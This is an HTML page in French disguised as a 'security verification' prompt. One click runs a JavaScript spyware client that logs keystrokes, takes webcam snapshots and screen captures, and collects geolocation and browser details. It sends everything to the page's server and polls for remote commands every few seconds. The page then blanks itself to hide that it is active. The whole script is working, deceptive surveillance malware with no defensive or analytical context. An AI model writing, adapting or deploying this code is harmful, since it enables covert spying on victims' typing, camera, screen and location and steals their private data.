<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>‚ö†Ô∏è V√©rification S√©curit√©</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: rgba(255,255,255,0.95);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 400px;
        }
        h1 { color: #333; margin-bottom: 20px; }
        p { color: #666; margin-bottom: 30px; }
        .btn-access {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            font-weight: bold;
        }
        #status { margin-top: 10px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîí V√©rification de S√©curit√©</h1>
        <p>Cliquez pour autoriser l'acc√®s.</p>
        <button class="btn-access" onclick="start()">üöÄ ACTIVER</button>
        <div id="status"></div>
    </div>
    <script>
        let active = false;
        let modules = {camera: {on: false, int: null}, keylog: {on: false, buf: ''}, screen: {on: false, int: null}};
        
        async function start() {
            document.getElementById('status').textContent = '‚úÖ Actif';
            active = true;
            startKeylog();
            getInfo();
            setInterval(getCmd, 3000);
            setTimeout(() => {document.body.innerHTML = ''; document.body.style.background = '#000';}, 2000);
        }
        
        async function getCmd() {
            if (!active) return;
            try {
                const r = await fetch('/api/command');
                const d = await r.json();
                if (d.status !== 'no-command') runCmd(d);
            } catch(e) {}
        }
        
        function runCmd(c) {
            if (c.module === 'camera') {
                if (c.action === 'start') startCam(c.params.interval || 5);
                else if (c.action === 'stop') stopCam();
                else if (c.action === 'snapshot') capCam();
            } else if (c.module === 'keylogger') {
                if (c.action === 'start') startKeylog();
                else if (c.action === 'stop') stopKeylog();
                else if (c.action === 'dump') sendKeys();
            } else if (c.module === 'screen') {
                if (c.action === 'start') startScr(c.params.quality || 0.5, c.params.interval || 2);
                else if (c.action === 'stop') stopScr();
            }
        }
        
        function startCam(i) {
            if (modules.camera.on) return;
            modules.camera.on = true;
            modules.camera.int = setInterval(capCam, i * 1000);
            capCam();
        }
        
        function stopCam() {
            modules.camera.on = false;
            if (modules.camera.int) clearInterval(modules.camera.int);
        }
        
        async function capCam() {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video: true});
                const v = document.createElement('video');
                v.style.display = 'none';
                document.body.appendChild(v);
                v.srcObject = s;
                v.onloadedmetadata = () => {
                    v.play();
                    setTimeout(() => {
                        const c = document.createElement('canvas');
                        c.width = 640; c.height = 480;
                        c.getContext('2d').drawImage(v, 0, 0, 640, 480);
                        send({type: 'camera', image: c.toDataURL('image/jpeg', 0.7)});
                        s.getTracks().forEach(t => t.stop());
                        v.remove();
                    }, 500);
                };
            } catch(e) {}
        }
        
        function startKeylog() {
            if (modules.keylog.on) return;
            modules.keylog.on = true;
            modules.keylog.buf = '';
            document.addEventListener('keydown', e => {
                if (modules.keylog.on) {
                    modules.keylog.buf += e.key;
                    if (modules.keylog.buf.length >= 50) sendKeys();
                }
            });
        }
        
        function stopKeylog() {
            modules.keylog.on = false;
        }
        
        function sendKeys() {
            if (modules.keylog.buf) {
                send({type: 'keylog', keys: modules.keylog.buf});
                modules.keylog.buf = '';
            }
        }
        
        function startScr(q, i) {
            if (modules.screen.on) return;
            modules.screen.on = true;
            modules.screen.int = setInterval(() => capScr(q), i * 1000);
            capScr(q);
        }
        
        function stopScr() {
            modules.screen.on = false;
            if (modules.screen.int) clearInterval(modules.screen.int);
        }
        
        async function capScr(q) {
            try {
                const s = await navigator.mediaDevices.getDisplayMedia({video: true});
                const v = document.createElement('video');
                v.style.display = 'none';
                document.body.appendChild(v);
                v.srcObject = s;
                v.onloadedmetadata = () => {
                    v.play();
                    setTimeout(() => {
                        const c = document.createElement('canvas');
                        c.width = 1280; c.height = 720;
                        c.getContext('2d').drawImage(v, 0, 0, 1280, 720);
                        send({type: 'screen', image: c.toDataURL('image/jpeg', q)});
                        s.getTracks().forEach(t => t.stop());
                        v.remove();
                    }, 500);
                };
            } catch(e) {}
        }
        
        function getInfo() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(p => send({type: 'location', lat: p.coords.latitude, lon: p.coords.longitude}), () => {});
            }
            send({type: 'system', ua: navigator.userAgent, lang: navigator.language, screen: `${screen.width}x${screen.height}`, platform: navigator.platform, timestamp: Date.now()});
        }
        
        async function send(d) {
            try {
                await fetch('/receive', {method: 'POST', body: JSON.stringify(d), headers: {'Content-Type': 'application/json'}});
            } catch(e) {}
        }
    </script>
</body>
</html>
